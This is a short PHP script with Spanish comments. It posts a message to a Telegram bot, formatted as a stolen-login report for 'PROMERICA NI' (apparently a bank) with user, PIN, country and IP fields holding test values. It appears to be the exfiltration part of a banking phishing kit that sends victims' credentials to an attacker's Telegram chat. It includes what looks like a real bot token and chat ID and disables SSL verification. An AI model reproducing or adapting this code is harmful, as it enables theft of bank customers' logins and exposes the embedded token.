<?php
// Token real de tu bot (obtenido de @BotFather)
$botToken = "6302268654:AAE5OyUgJ8_My1ArZHTGdVfiRgvhCiVkvhU";
$chatId = "1884350168";

// Codificar el mensaje para URL
$message = urlencode("PROMERICA NI 📲
📧 Usuario => 2323
🔑 Pin => 99999999
================================
📍 País => Desconocido
📍 IP => ::1
================================");

// URL corregida
$url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&parse_mode=HTML&text={$message}";

// Usar cURL en lugar de file_get_contents para mejor manejo de errores
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if ($httpCode !== 200) {
    echo "Error: HTTP Code " . $httpCode;
    echo "Response: " . $response;
} else {
    echo '{"success": true}';
}

curl_close($ch);
?>